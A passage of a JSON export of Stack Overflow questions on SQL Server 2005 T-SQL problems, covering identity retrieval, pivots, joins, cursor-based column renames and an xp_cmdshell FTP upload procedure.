</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":112,"score":-1,"question_id":11047309,"title":"why i am getting null ,when try to get last identity value from a table","body":"<p>I have a table (log table,which has been created as a part of ssis error handling and logging)e in the database.I am inserting a row in this table and trying to get the last identity value from the table using scope_identity() But I am getting <strong>NULL</strong> for the scope_identity?().Please see the dml statement and the scope_identity() statements being used as a part of one stored procedure</p>\n\n<pre><code>insert into logging.execution_log\n            (ParentLogID, Description, PackageName, PackageGuid, MachineName, ExecutionGuid, LogicalDate, Operator, StartTime, EndTime, Status,FailureTask)\n        select @ParentLogID, @Description, @PackageName, cast(@PackageGuid as uniqueidentifier), @MachineName, cast(@ExecutionGuid as uniqueidentifier),\n                @logicalDate, @operator, getdate(), null, @status, null\n\n\n\n**set @LogID = cast(scope_identity() as int)**\n</code></pre>\n\n<p>but when ever i try to get a value of @logid it returns null only</p>\n\n<p>Please be noted that there is already a identity specification on the column <strong>LogId</strong> of the  of logging.execution_log table </p>\n\n<h2>Regards</h2>\n\n<p>*<strong>Additional Details(i have just understood when I have done some testings)</strong>\nAs a part of testing i have inserted some new rows manually like below \ninsert into logging.execution_log\n            (ParentLogID, Description, PackageName, PackageGuid, MachineName,\n             ExecutionGuid, LogicalDate, Operator, StartTime, EndTime, Status,FailureTask)</p>\n\n<pre><code>    select 1, 2, 3, **NEWID()**,\n     5, **NEWID()**,\n            7, 8, getdate(), null, 0, null\n\nselect scope_identity()\nselect * from logging.execution_log\n</code></pre>\n\n<p>then it show the last value of identity.........it is fine\nbut the problem is when i pass the PackageGuid as <strong>system::Packageid</strong>(ssis system variable) and ExecutionGuid as <strong>system::executioninstanceGUID</strong> then it does insert the row in the table correctly but i can not get the last identity value using scope_identi or @@identity or ident_current(all shows null)*</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":124,"score":1,"question_id":11047703,"title":"Format string inside sql query when use stored procedure in Sql Server 2005","body":"<p>I have a query inside my stored procedure:</p>\n\n<pre><code>IF @backup = 0\n    BEGIN\n       SELECT sql = 'BACKUP DATABASE MyDatabase TO DISK=\"'+@file+'\"';\n    END\n</code></pre>\n\n<p><code>@file</code> is <code>nvarchar(MAX)</code> and <code>backup</code> is <code>int</code>.</p>\n\n<p>If I execute the stored procedure like:</p>\n\n<pre><code>DECLARE @return_value int\n\nEXEC    @return_value = [dbo].[usp_cp_backup_restore_db]\n        @backup = 0,\n        @file = N'C:\\backupFiles\\MyDatabase.bak'\n</code></pre>\n\n<p>but the result becomes:\n<code>BACKUP DATABASE ContentPlatform TO DISK=\"C:\\backupFiles\\MyDatabase.bak\"</code></p>\n\n<p>I want to appear <code>BACKUP DATABASE ContentPlatform TO DISK='C:\\backupFiles\\MyDatabase.bak'</code>\nbecause the correct format is </p>\n\n<pre><code>BACKUP\nDATABASE MyDatabase TO\nDISK='C:\\MyDatabase.bak'\n</code></pre>\n\n<p>accordingly with <a href=\"http://dwhanalytics.wordpress.com/2011/03/15/sql-serverexclusive-access-could-not-be-obtained-because-the-database-is-in-usethe-tail-of-the-log-for-the-database-has-not-been-backed-up/\" rel=\"nofollow\">http://dwhanalytics.wordpress.com/2011/03/15/sql-serverexclusive-access-could-not-be-obtained-because-the-database-is-in-usethe-tail-of-the-log-for-the-database-has-not-been-backed-up/</a></p>\n\n<p>Any suggestions ?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","find","sum","pivot"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":236,"score":0,"question_id":11044334,"title":"How to find Sum Of Pivoting two columns in SQL Server 2005?","body":"<p>I am using following procedure to retrieve total <code>presents</code> and <code>absents</code> by using pivot query....i want to <code>SUM</code> of <code>Presents[P]</code> And <code>Absents[A]</code> And then <code>calculate percentage</code> </p>\n\n<p>ALTER PROCEDURE [dbo].[GetAttendence](@Course_Id varchar(30), @Semester varchar(10))</p>\n\n<pre><code>AS\n   SELECT DISTINCT Enroll_Number, Course_Id, Semester, Isnull([P],0) \n                                           As Presents, Isnull([A],0) As Absents\n\n    FROM (SELECT Enroll_Number, Course_Id, Semester, Flag from Attendence ) ps\n    pivot(Count(Flag) for Flag in ([P],[A])) as pvt \n\n    WHERE Course_Id = @Course_Id and Semester = @Semester\n</code></pre>\n\n<p>This is <code>Forula</code> to implement....</p>\n\n<p>Sum = Presents + Absents</p>\n\n<p>Percentage = ((Presents / Sum) * 100)</p>\n"},{"tags":["sql-server-2005","indexed-view"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":11045789,"title":"Will updating any field cause updating indexed view?","body":"<p>Here is a description in MSDN of the indexed view\"As modifications are made to the data in the base tables, the data modifications are reflected in the data stored in the indexed view\".</p>\n\n<p>But i'm confused now, will updating any field in base table cause the auto maintain of the indexed view, even this field isn't included in the definition of the the indexed view? </p>\n\n<p>Thanks!</p>\n"},{"tags":["sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":11045940,"title":"how to find the biggest procedure in the database?","body":"<p>Hi i am using SQL Server 2008 R2,\ni have lots of procedures in the database. \namongest those i want to find the biggest procedure in terms of rows ?\nis it possible to find the procedure having the count as their number of rows in it.\nplease can somebody help me to get this.</p>\n\n<p>Thanks! in adavanced.</p>\n"},{"tags":["html","sql-server-2005","sp-send-dbmail"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":11045857,"title":"Text over image using html code placed in a storedprocedure in sql server 2005 doesnt respond properly","body":"<p>I have an image and some dynamic contents need to be placed over it, i do it using html code, the contents will be fetched from db tables and this will be done when i place the html design part in the stored procedure, this stored proc when executed as mailer with body in html format gives an output in which the baground image is seperated from the contents and displayed below, whereas if put the same html part in a notepad the design is perfect. Im not sure why the design is changed, some told me that the outlook doesnt support this.. Can this be achieved in anyways??? i want the text over image part to be displayed in the body part of a mail. Thanks in advance.</p>\n"},{"tags":["excel","sql-server-2005","excel-2007"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":109,"score":2,"question_id":10979947,"title":"only one select query is showing in excel worksheet","body":"<p>I've call a stored procedure (SQL Server 2005) in Excel 2007. This SP has two select statements, however in excel worksheet, result of first statement is showing. Any thoughts?</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":11043930,"title":"How to structure tsql query to handle multiple subtables","body":"<p>I need help with how to write a SQL Server 2005 query to handle joining multiple subtables.  Here is my scenario:</p>\n\n<p>Tables:</p>\n\n<p>Customers</p>\n\n<ul>\n<li>Customer_PK</li>\n</ul>\n\n<p>Orders</p>\n\n<ul>\n<li>Order_PK</li>\n<li>OrdersTypeA_FK</li>\n<li>OrdersTypeB_FK</li>\n<li>OrdersTypeC_FK</li>\n<li>Customer_FK</li>\n</ul>\n\n<p>OrdersTypeA</p>\n\n<ul>\n<li>OrdersTypeA_PK</li>\n<li>Shipper_FK</li>\n</ul>\n\n<p>OrdersTypeB</p>\n\n<ul>\n<li>OrdersTypeB_PK</li>\n<li>Shipper_FK</li>\n</ul>\n\n<p>OrdersTypeC</p>\n\n<ul>\n<li>OrdersTypeC_PK</li>\n<li>Shipper_FK</li>\n</ul>\n\n<p>Shippers</p>\n\n<ul>\n<li>Shipper_PK</li>\n<li>ShipperAddress_FK</li>\n</ul>\n\n<p>ShipperAddress</p>\n\n<ul>\n<li>ShipperAddress_PK</li>\n<li>ShipperState</li>\n</ul>\n\n<p>The Orders table has data that looks like the following:</p>\n\n<pre><code>Order_PK   OrdersTypeA_FK    OrdersTypeB_FK    OrdersTypeC_FK    Customer_FK\n--------   --------------    --------------    --------------    -----------\n1          1                 null              null              1\n2          null              1                 null              2\n3          null              null              1                 3\n</code></pre>\n\n<p>My issue is that I need to have the select join statement retrieve the ShipperAddress by finding the Shipper_FK from one of the three OrdersType tables.  The Orders table will only have one of the OrdersType FK per row.  The only thing I need to retreive from the OrdersType table is the Shipper_FK so that I can join to the ShipperAddress table.</p>\n\n<p>So how does the join look???</p>\n\n<pre><code>select \nShipperAddress.ShipperState \nfrom Customers\nleft join Orders on Orders.Customer_FK = Customers.Customer_PK\n\n????????\n\nleft join Shippers on Shipper_PK = ??????.Shipper_FK\nleft join ShipperAddress on ShipperAddress.ShipperAddress_PK = Shippers.ShipperAddress_FK\n</code></pre>\n\n<p>I can't have a separate join down to ShipperAddress for each of the OrdersType tables.  This is a smaller sample of an issue that has many more tables at the OrdersType level.  The Shipper_FK is the same in each of the OrdersType tables.  I need to get at the Shipper_FK no matter what OrdersType table it came from to continue with the join statement.  How can that be done?</p>\n"},{"tags":["sql-server","query","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":9797834,"title":"SQL Server 2005 Finding the user","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/9798710/sql-server-2005-how-to-find-the-user-who-has-all-books\">SQL Server 2005 How to Find the user who has all books</a>  </p>\n</blockquote>\n\n\n\n<p>I have a question about sql query.</p>\n\n<p>I am trying to make the query that user who has all computer book. \nFor example, \nI have two tables,</p>\n\n<p>1) Item table</p>\n\n<pre><code>|itemid |item_name          |\n\n|1      | computerbook1     |\n\n|2      | computerbook2     |\n\n|3      | computerbook3     |\n\n|4      | mathbook1         |\n\n|5      | mathbook2         |\n\n|6      | physicsbook       | \n</code></pre>\n\n<p>2) userinventory table</p>\n\n<pre><code>|used_id | name_item        |\n\n|1       | computerbook1    |\n\n|1       | computerbook2    |\n\n|1       | computerbook3    |\n\n|2       | computerbook1    |\n\n|2       | mathbook1        |\n\n|2       | physicsbook      |\n\n|3       | computerbook1    |\n\n|3       | computerbook3    |\n</code></pre>\n\n<p>Since user \"1\" has all of computer book, I would like make query that returning the user 1.</p>\n\n<p>What I did was...</p>\n\n<pre><code>Create Table #tmp (\n    Classname [varchar](50) NOT NULL\n)\n\nINSERT INTO #tmp\nSELECT DISTINCT item_name  \nFROM ITEM\nWHERE item_name  like 'computerbook%'\n</code></pre>\n\n<p>I would like to compare to find user who has all of item..</p>\n\n<p>However, I am not really sure how to do it.. because I can not use <strong>count</strong> or any aggression</p>\n\n<p>Do not use \"count\"</p>\n\n<p>Does anyway know they way to find user id who has all of computerbook?</p>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":411,"score":1,"question_id":11014949,"title":"Combining multiple column into one in sql server 2005","body":"<p>I have a table like below:</p>\n\n<pre><code>Table A\n----------\nID   Field1 Field2 Field3\n1     A     NULL   B\n2     B     NULL   NULL \n3     C     A      NULL \n4     A     D      NULL \n</code></pre>\n\n<p>The requirement is to combine all the Fields (except ID) into one, so that Table will look like as below:</p>\n\n<pre><code>Table A\n-------\nID   Field\n1     A   \n2     B    \n3     C   \n4     D \n</code></pre>\n\n<p>Any order will be okay though the values have to be distinct. This means that Field1 to Field3 needs to be one column (in any temp table) and have distinct values. I used ID columns just to clarify the result however ID is not required. Currently I'm using union for the desired output\ne.g. </p>\n\n<pre><code>select distinct Field\nfrom\n(Select Field1 as Field from TableA\nwhere Field1 is not null\nunion\nSelect Field2 from TableA\nwhere Field2 is not null\nunion\nSelect Field3 from TableA\nwhere Field3 is not null\n) \n</code></pre>\n\n<p>I'm sure that there is better way of achieving the same output with less line of codes.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":11041441,"title":"How to Aggregate Data from a Subquery that Requires a Filter?","body":"<p>Sorry if the title is confusing, I'll try to explain. I have a query that needs to have a couple of aggregate fields, but I don't know how to write one of them. Here's the current script:</p>\n\n<pre><code>DECLARE @Date DATETIME;\nDECLARE @FromDate VARCHAR(25);\nDECLARE @ToDate VARCHAR(25);\n\nSET     @Date = GETDATE();\nSET     @FromDate = CONVERT(VARCHAR(25), DATEADD(dd, -(DAY(@Date) - 1), @Date),101);\nSET     @ToDate = CONVERT(VARCHAR(25), DATEADD(dd, -(DAY(DATEADD(mm, 1, @Date))), DATEADD(mm,1,@Date)), 101);\n\nSELECT  DISTINCT    [A].[Name],\n                    COUNT([O].[Id]) AS [OpportunityCount],\n                    (CASE WHEN (SUM([O].[Amount]) IS NULL) THEN 0.00 ELSE SUM([O].[Amount]) END) AS [OpportunityTotalAmounts]\n                    --(SELECT COUNT(1) FROM [Opportunity] AS [O1] WHERE ([O1].[Id] = [O].[Id]) AND ([O1].[StageName] != 'Not Sold'))\nFROM                [Account] AS [A]\n                    JOIN [RecordType] AS [RT] ON ([A].[RecordTypeId] = [RT].[Id])\n                    JOIN [Contact] AS [C] ON ([A].[Id] = [C].[AccountId])\n                    JOIN [OpportunityContactRole] AS [OCR] ON ([C].[Id] = [OCR].[ContactId])\n                    LEFT OUTER JOIN [Opportunity] AS [O] ON ([OCR].[OpportunityId] = [O].[Id])\nWHERE               ([RT].[Name] = 'PHX')\n                    AND ([A].[TypeMS__c] != 'Customer')\n                    AND ([O].[CreatedDate] BETWEEN @FromDate AND @ToDate)\nGROUP BY            [A].[Name];\n</code></pre>\n\n<p>You'll notice a commented out line. On that line I want to get a count of all <code>Opportunities</code> that are not marked as <code>'Not Sold'</code>. It works if I add <code>[O].[Id]</code> to the <code>GROUP BY</code>, but then the result set expands because the grouping gets messed up.</p>\n\n<p>How can I get the count I want?</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":11040803,"title":"SQL aggregate of calculated field","body":"<p>Using SQL Server 2005 I have a query that gets child records from bundles that has a calculated field for quantity.  The query looks something like this:</p>\n\n<pre><code>SELECT  TblB_1.fooID, \n    TblC.quantity * (TblA.quantity) AS Quantity, \n    TblB_1.name AS Name\n    FROM    TblB AS TblB_1 INNER JOIN\n              TblC ON TblB_1.fooID = TblC.fooID RIGHT OUTER JOIN\n              TblB INNER JOIN\n                TblA ON TblB.fooID = TblA.fooID ON TblC.parentfooID = TblB.fooID\n    WHERE   (TblB.isBundle = 1) AND (TblA.isDeleted = 0)\n</code></pre>\n\n<p>I need to be able to group by id and get a SUM of the quantity field.  I've tried wrapping the quantity line with sum like this:</p>\n\n<pre><code>SUM(TblC.quantity * (TblA.quantity)) AS Quantity,\n</code></pre>\n\n<p>Then adding</p>\n\n<pre><code>GROUP BY TblB_1.fooID\n</code></pre>\n\n<p>after the WHERE clause, but that results in a \"TblB_1.name is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause\" error.</p>\n\n<p>I also tried to get my head around using a subquery for this task, but I was not able to make that work either, nor could I find an example here or on the Web that I have been able to adapt.  Thanks - Dan</p>\n"},{"tags":["java","sql-server-2005","hibernate","jpa"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":467,"score":0,"question_id":3968277,"title":"Hibernate Annotations - id is not set correctly","body":"<p>I have a whole bunch of Java beans annotated like this with JPA:</p>\n\n<pre><code>import javax.persistence.Entity;\nimport javax.persistence.GeneratedValue;\nimport javax.persistence.GenerationType;\nimport javax.persistence.Id;\n\n@Entity\npublic class TitleEntry extends Entry {\n    private Long id;\n\n    public TitleEntry() { }\n\n    public TitleEntry(String code, String label) {\n        super(code, label);\n    }\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.AUTO)\n    public Long getId() {\n        return id;\n    }\n\n    protected void setId(Long id) {\n        this.id = id;\n    }\n}\n</code></pre>\n\n<p>The id is always generated like this for every object and seems to be working fine.  </p>\n\n<p>Now the problem:\nWhen I save an object in Java:</p>\n\n<pre><code>dao.save(titleEntry);\n</code></pre>\n\n<p>the id-property of the bean is set to a int-value, that does <strong>not</strong> correspond with the actual id.\nIt corresponds to the hibernate_sequence (I think).</p>\n\n<p>Questions:</p>\n\n<ol>\n<li>Why?</li>\n<li>What is hibernate_sequence anyway (can't find a decent explanation on Hibernate website)?</li>\n<li>How can I fix it?</li>\n</ol>\n\n<p>Note: I'm using Java 1.6, MSSQL2005, Hibernate3</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":1059,"score":0,"question_id":11035187,"title":"How do I fetch multiple columns for use in a cursor loop?","body":"<p>When I try to run the following SQL snippet inside a cursor loop, </p>\n\n<pre><code>set @cmd = N'exec sp_rename ' + @test + N',' +\n           RIGHT(@test,LEN(@test)-3) + '_Pct' + N',''COLUMN'''\n</code></pre>\n\n<p>I get the following message,</p>\n\n<blockquote>\n  <p>Msg 15248, Level 11, State 1, Procedure sp_rename, Line 213<br>\n     Either the parameter <code>@objname</code> is ambiguous or the claimed <code>@objtype</code> (COLUMN) is wrong.</p>\n</blockquote>\n\n<p>What is wrong and how do I fix it ? I tried wrapping the column name in brackets <code>[]</code>, and double quotes <code>\"\"</code> like some of the search results suggested. </p>\n\n<p>Edit 1 -</p>\n\n<p>Here is the entire script. How do I pass the table name to the rename sp ? I'm not sure how to do that since the column names are in one of many tables.</p>\n\n<pre><code>BEGIN TRANSACTION\n\ndeclare @cnt int\ndeclare @test nvarchar(128)\ndeclare @cmd nvarchar(500) \ndeclare Tests cursor for\nSELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE 'pct%' AND TABLE_NAME LIKE 'TestData%'\n\nopen Tests\nfetch next from Tests into @test\nwhile @@fetch_status = 0\nBEGIN\n  set @cmd = N'exec sp_rename ' + @test + N',' + RIGHT(@test,LEN(@test)-3) + '_Pct' + N', column' \n\n  print @cmd\n\n  EXEC sp_executeSQL @cmd\n\n  fetch next from Tests into @test\nEND\n\nclose Tests \ndeallocate Tests\n\n\nROLLBACK TRANSACTION\n--COMMIT TRANSACTION\n</code></pre>\n\n<p>Edit 2 - \nThe script is designed to rename columns whose names match a pattern, in this case with a \"pct\" prefix. The columns occur in a variety of tables within the database. All table names are prefixed with \"TestData\".</p>\n"},{"tags":["sql-server","query","sql-server-2005","user"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":503,"score":0,"question_id":11037226,"title":"Query all Databases a User has Access to as Administrator","body":"<p>I'm looking to query all databases mapped to a user, similar to Security > Logins > Properties > User Mapping.</p>\n\n<p>This may be done in SQL 2005 if possible</p>\n\n<p>For example, something similar to:</p>\n\n<pre><code>SELECT name\nFROM sys.databases\nWHERE HAS_DBACCESS(name) = 1\n</code></pre>\n\n<p>But perform the query from an administrative user, as opposed to running the above query as the user itself. </p>\n\n<p>How would something like this be performed?</p>\n\n<p>Thank you.</p>\n"},{"tags":["sql","sql-server-2005","database-design"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":127,"score":0,"question_id":11020646,"title":"Should underscores be used in column names?","body":"<p>Technically, the underscore character (_) can be used in column names. But is it good practice to use underscores in column names ? It seems to make the name more readable but I'm concerned about technical issues which may arise from using them. Column names will not be prefixed with an underscore. </p>\n"},{"tags":["sql-server-2008","sql-server-2005","vb6","type-conversion"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":175,"score":1,"question_id":11035814,"title":"Comparing string with SmallDateTime used to work","body":"<p>I'm trying to debug an old <code>VB6</code> program at my job.\nIt's full of bugs and hardcoded stuff.</p>\n\n<p>The program is connecting on a SQL server 2005 database to read and write info using stored procedures.</p>\n\n<p>Since the program is still being used while i'm working on it, I made a backup of the database to test some things and restored it in my version of SQL server 2008. Everything was working fine.</p>\n\n<p>When I came in the next morning, I got an error I didn't have the previous night even though the program wasn't used in the night.</p>\n\n<p>The problem :</p>\n\n<pre><code>           \"exec dbo.sp_Get_Wait_Data '\" &amp; DateEx &amp; \"'\"\n</code></pre>\n\n<p><code>DateEx</code> is a string containing <code>\"2012/06/14\"</code></p>\n\n<p>The stored procedure :</p>\n\n<pre><code>           [sp_Get_Wait_Data] @Datest as char(10)  AS \n           SELECT(A lot of variables here) from Fiche\n           left join voyage on fcid=vofiche\n           left join client on fcaccount=cusnov\n           where fcdate=@Datest and (void is null or (void&gt;0 and (void&lt;&gt;999 and               void&lt;&gt;1000 and void&lt;&gt;998))) and ((fcremarques not like '%SYSANNULATION%' or fcremarques is null ) and fcrettime is not null)\n           order by FcTime,FcOrgSite,fcdessite\n</code></pre>\n\n<p>The error message : </p>\n\n<pre><code>           the conversion of a varchar data type to a smalldatetime data type resulted in an out-of-range value\n</code></pre>\n\n<p>So the error is here  <code>fcdate=@Datest</code> in the stored procedure. So i tried adding this line in the stored procedure <code>SELECT convert(datetime, @Datest, 120)</code> which worked like a charm for the converstion within the querry but caused a few hundread other errors within the program when other querys tried to access this variable so it is not an option.</p>\n\n<p>Any idea why this query was working perfectly yeaterday and now it's giving me this error ? Thanks in advance.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":542,"score":1,"question_id":11033340,"title":"How to find sum of multiple columns in a table in SQL Server 2005?","body":"<p>I have a table <code>Emp</code> which has these rows:</p>\n\n<p><img src=\"http://i.stack.imgur.com/nYKTJ.png\" alt=\"enter image description here\"></p>\n\n<p>I want to find <code>SUM</code> of <code>val1, val2, val3</code> and which will show in the <code>Total</code> column.</p>\n\n<p>Please help me out on this then I will be thankful to you.</p>\n"},{"tags":["sql","tsql","sql-server-2005","ftp","xp-cmdshell"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":552,"score":2,"question_id":11028655,"title":"T-SQL FTP using xp_cmdshell","body":"<p>I am using the below code snippet to FTP simple text files from a Windows Server 2003 / SQL Server 2005 database to a BULL FTP site and am getting some corruption on the BULL end.</p>\n\n<pre><code>select @cmd = 'ftp -s:' + @workdir + @workfilename\nexec master..xp_cmdshell @cmd, NO_OUTPUT\n</code></pre>\n\n<p>The text file contains SEP490067 but when this is opened on the BULL it appears like this ..S.E.P.4.9.0.0.6.7..</p>\n\n<p>I have seen something like this before when sending files using an SSIS FTP component and switching the IsTransferAscii switch to True fixes the problem. The question I have is doe you have to set another commands line switch in the FTP command above to sent the files using ASCII rather than Binary?</p>\n\n<p>Here is the fully TSQL</p>\n\n<pre><code>USE [JCB_QSmart]\nGO\n/****** Object:  StoredProcedure [dbo].[FTP_PutFile]    Script Date: 06/14/2012 08:56:55 ******/\nSET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nALTER procedure [dbo].[FTP_PutFile]\n@FTPServer  varchar(128) ,\n@FTPUser    varchar(128) ,\n@FTPPWD     varchar(128) ,\n@FTPPath    varchar(128) ,\n@FTPFileName    varchar(128) ,\n@SourcePath varchar(128) ,\n@SourceFile varchar(128) ,\n@workdir    varchar(128),\n    @ShowOutput as bit = 0\nas\n\ndeclare @cmd varchar(1000)\ndeclare @workfilename varchar(128)\n\n    select @workfilename = 'ftpcmd.txt'\n\n    -- deal with special characters for echo commands\n    select @FTPServer = replace(replace(replace(@FTPServer, '|', '^|'),'&lt;','^&lt;'),'&gt;','^&gt;')\n    select @FTPUser = replace(replace(replace(@FTPUser, '|', '^|'),'&lt;','^&lt;'),'&gt;','^&gt;')\n    select @FTPPWD = replace(replace(replace(@FTPPWD, '|', '^|'),'&lt;','^&lt;'),'&gt;','^&gt;')\n    select @FTPPath = replace(replace(replace(@FTPPath, '|', '^|'),'&lt;','^&lt;'),'&gt;','^&gt;')\n\n    select  @cmd = 'echo '                  + 'open ' + @FTPServer\n            + ' &gt; ' + @workdir + @workfilename\n    exec master..xp_cmdshell @cmd\n    select  @cmd = 'echo '                  + @FTPUser\n            + '&gt;&gt; ' + @workdir + @workfilename\n    exec master..xp_cmdshell @cmd\n    select  @cmd = 'echo '                  + @FTPPWD\n            + '&gt;&gt; ' + @workdir + @workfilename\n    exec master..xp_cmdshell @cmd\n    select  @cmd = 'echo '                  + 'put ' + @SourcePath + @SourceFile + ' ' + @FTPPath + @FTPFileName\n            + ' &gt;&gt; ' + @workdir + @workfilename\n    exec master..xp_cmdshell @cmd\n    select  @cmd = 'echo '                  + 'quit'\n            + ' &gt;&gt; ' + @workdir + @workfilename\n    exec master..xp_cmdshell @cmd\n\n    select @cmd = 'ftp -s:' + @workdir + @workfilename\n\n    create table #a (id int identity(1,1), s varchar(1000))\n    insert #a\n    exec master..xp_cmdshell @cmd, NO_OUTPUT\n\n    select id, ouputtmp = s from #a\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","ssas","analysis"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":11031942,"title":"Analysis Services - Unary Operator in 2 dimensions?","body":"<p>In my SQL Database I have created some Views for each of my wanted Dimensions. The views (different Values!) look like:</p>\n\n<pre><code>Parent | CHILD | UnaryOperator\n xxxx  | yyyy  | +\n yyyy  | dddd  | -\n</code></pre>\n\n<p>............................</p>\n\n<p>When I now create one dimension(set attribute for unaryOperatorColumn,...) in my Analysis Services everytthing works fine. The Measure is calculated correctly by the unary operators.</p>\n\n<p>But if I create another dimension (based on another View!) and create the Cube the measure for both dimensions are wrong.</p>\n\n<p>Is it my fault or isn`t it possible?</p>\n"},{"tags":["sql","sql-server-2005","distinct"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":126,"score":1,"question_id":11031119,"title":"SQL - Distinct One Col, Select Multiple other?","body":"<p>I've been trying to understate the best way to write an MS SQL 2005 query which pretty much does the following...</p>\n\n<pre><code>select distinct col1, col2, col3\nfrom table1\n</code></pre>\n\n<p>Basically I want to perform Distinct on col1 but I dont want Dististinc on Col2/3, I just want there values.</p>\n\n<p>I understand its not possible to write the query this way as I think I read the Distinct is applied to the row and not the col?</p>\n\n<p>Could anyone please point me in the right direction? I did try right joing the values back in but this didnt work as I had to specify the extra joined cols in the distinct select which in turn performed the distinct on these, i.e..</p>\n\n<pre><code>select distinct t1.col1, t2.col2, t3.col3\nfrom table1 t1\nright join (select col1, col2, col3 from table1) t2\non t1.col1 = t2.col1\n</code></pre>\n\n<p>Edited to explain better..</p>\n\n<pre><code>select distinct t1.Hostname, t2.IP, t2.ActionDateTime, t2.Action\nfrom tblUserActions t1\nright join (select Hostname, IP, ActionDateTime from tblUserActions) t2\non t1.Hostname = t2.Hostname\n</code></pre>\n\n<p>Basically this table is a list of thousands of user actions and im trying to list distinct on the Hostname so I should only receive say 10 rows as thats how many different Hostnames there are. Then based on these hostnames I want to also join the most recent record data to the rows returned, so I'd like to return:</p>\n\n<pre><code>  Hostname, IP, ActionDateTime, Action\n1 Host1, 165.123.123.1, 2012-06-14 02:07:08, Logon\n2 Host2, 165.123.123.2, 2012-06-14 03:07:08, Logoff\n3 Host3, 165.123.123.3, 2012-06-14 04:07:08, Logon\n4 Host4, 165.123.123.4, 2012-06-14 05:07:08, Logoff\netc...\n</code></pre>\n\n<p>Any help/pointers would be great! Cheers.</p>\n"},{"tags":["visual-studio-2010","entity-framework","sql-server-2005","entity-framework-4"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":142,"score":0,"question_id":10897287,"title":"Entity Framework 4 doesn't recognize referential integrity in my database","body":"<p>Trying to test the option of replacing our internal data access layer with Entity Framework 4 in our existing web application, I have started a new project and added an ADO.NET Entity Data model, then let it generate from the existing database.</p>\n\n<p>It recognizes the tables in my database but it doesn't show any relationships between these tables, they are totally separated from each other. Is there any preconditions on the database so one can use the database first method?</p>\n\n<p>DBMS is SQL Server 2005, PK and FK are defined in the database.</p>\n\n<p>Thank you in advance</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":99,"score":2,"question_id":11027780,"title":"CASE for joining sql tables","body":"<p>I need a help on sql database side. And i have </p>\n\n<p>table 1 : ENTITY_TYPE</p>\n\n<pre><code>entity_type_id  entity_name\n     1            Task\n     2            Page\n     3            Project\n     4            Message\n     5            User\n</code></pre>\n\n<p>and table 2 : MESSAGE , that contains message from each entity values like</p>\n\n<pre><code>message_id entity_type owner_tableid message\n    1           1             12       A message on task level\n    2           3             14       A message on project level\n</code></pre>\n\n<p>and I want select these message according to each entity type and details from its owner table using 'owner_tableid'   ie a query like....</p>\n\n<pre><code>select * from MESSAGE JOIN\ncase entity_type when 1 then taskTable\nwhen 2 then pageTable\nwhen 3 then projectTable\nwhen 4 then MessageTable\nwhen 5 then UserTable\n</code></pre>\n\n<p>Which is best method to solve this issue on single procedure. Any idea ?? Now I am using IF clause for each entity...</p>\n"},{"tags":["sql","sql-server","sql-server-2005","export"],"answer_count":7,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1931,"score":2,"question_id":11009189,"title":"Export table data from one SQL Server to another","body":"<p>I have two SQL Servers (both 2005 version).</p>\n\n<p>I want to migrate several tables from one to another.</p>\n\n<p>I have tried:</p>\n\n<ul>\n<li><p>On source server I have right clicked on the database, selected <code>Tasks/Generate scripts</code>.\nThe problem is that under <code>Table/View options</code> there is no <code>Script data</code> option.</p></li>\n<li><p>Then I used <code>Script Table As/Create script</code> to generate SQL files in order to create the tables on my destination server. But I still need all the data.</p></li>\n</ul>\n\n<p>Then I tried using:</p>\n\n<pre><code>SELECT * 